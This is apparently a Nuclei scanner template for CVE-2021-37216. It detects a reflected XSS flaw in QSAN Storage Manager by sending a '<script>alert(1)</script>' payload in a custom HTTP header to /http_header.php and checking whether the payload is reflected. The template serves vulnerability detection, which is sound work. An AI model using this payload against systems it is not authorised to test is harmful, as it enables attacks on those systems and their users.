id: CVE-2021-37216
info:
  author: dwisiswant0
  classification:
    cve-id: CVE-2021-37216
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  description: 'QSAN Storage Manager header page parameters does not filter special
    characters.

    Remote attackers can inject JavaScript without logging in and launch

    reflected XSS attacks to access and modify specific data.

    '
  name: QSAN Storage Manager prior to v3.3.3 Reflected XSS
  reference:
  - https://www.twcert.org.tw/tw/cp-132-4962-44cd2-1.html
  severity: medium
  tags: cve,cve2021,xss,qsan,storage
requests:
- headers:
    X-Trigger-XSS: <script>alert(1)</script>
  matchers:
  - part: body
    type: word
    words:
    - '"HTTP_X_TRIGGER_XSS":"<script>alert(1)</script>"'
  - part: header
    type: word
    words:
    - text/html
  - dsl:
    - '!contains(tolower(all_headers), ''x-xss-protection'')'
    type: dsl
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/http_header.php'
